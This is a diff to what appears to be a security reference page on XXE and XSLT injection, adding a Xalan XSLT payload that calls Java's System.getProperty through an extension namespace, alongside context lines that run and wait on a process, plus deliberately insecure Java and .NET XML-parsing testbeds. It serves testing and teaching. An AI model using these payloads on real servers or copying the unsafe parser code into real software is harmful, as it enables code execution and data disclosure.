@@ -429,6 +429,28 @@ XXE nature allows to target several protocols and several files at a time (becau
             <xsl:variable name="waiting" select="process:waitFor($process)" />
             <xsl:value-of select="$process" />
 
+            <xsl:variable name="osversion" select="jv:java.lang.System.getProperty('os.name')"/>
+            <xsl:value-of select="$osversion" />
+
+        </div>
+        </div>
+        
+        <div class="spoiler"><div class="spoiler-title"><i>
+        Xalan
+        </i></div><div class="spoiler-text" markdown="1">
+
+            <xsl:stylesheet
+                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+                xmlns:jv="http://xml.apache.org/xalan/java"
+                exclude-result-prefixes="jv" version="1.0">
+            <xsl:template match="/">
+            <root>
+                <xsl:variable name="osversion" select="jv:java.lang.System.getProperty('os.name')"/>
+                <xsl:value-of select="$osversion" />
+            </root>
+            </xsl:template>
+            </xsl:stylesheet>
+
         </div>
         </div>
 
@@ -799,6 +821,40 @@ echo $xslt->transformToXML($dom);
     {% endhighlight %}
 
 *php.ini: allow_url_fopen - ???*
+
+</div>
+</div>
+<br>
+
+<div class="spoiler"><div class="spoiler-title">
+    <i>Java (SAX parser) testbed for loading XML file</i>
+</div><div class="spoiler-text" markdown="1">
+
+    {% highlight java %}
+private static Document buildDOM (String sXML)
+throws ParserConfigurationException, SAXException, IOException
+{
+    DocumentBuilder builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
+    return builder.parse(new InputSource(new StringReader(sXML)));
+}
+    {% endhighlight %}
+
+</div>
+</div>
+<br>
+
+<div class="spoiler"><div class="spoiler-title">
+    <i>.NET (MSXML parser) testbed for loading XML file</i>
+</div><div class="spoiler-text" markdown="1">
+
+    {% highlight csharp %}
+private void processUserRequest(string requestAsXML)
+{
+    XmlDocument d = new XMLDocument();
+    d.Load(requestAsXML);
+    string value = d.SelectSingleNode("description").InnerText;
+}
+    {% endhighlight %}
 
 </div>
 </div>
